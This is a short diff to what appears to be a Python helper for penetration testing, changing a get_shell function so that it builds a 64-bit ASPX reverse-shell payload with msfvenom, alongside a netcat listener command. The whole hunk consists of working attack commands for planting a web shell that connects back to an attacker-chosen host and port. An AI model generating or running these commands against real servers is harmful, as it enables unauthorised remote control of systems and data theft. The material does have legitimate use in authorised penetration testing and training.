@@ -98,7 +98,7 @@ def get_shell(ipaddr: str, port: int) -> dict:
         "description":
         "ASPX stageless reverse shell",
         "reverse":
-        "msfvenom -p windows/shell_reverse_tcp LHOST=%s LPORT=%d -f aspx -o reverse.aspx" %
+        "msfvenom -p windows/x64/shell_reverse_tcp LHOST=%s LPORT=%d -f aspx -o reverse.aspx" %
         (ipaddr, port),
         "listen":
         "rlwrap -cAr nc -lvnp %d" % (port),
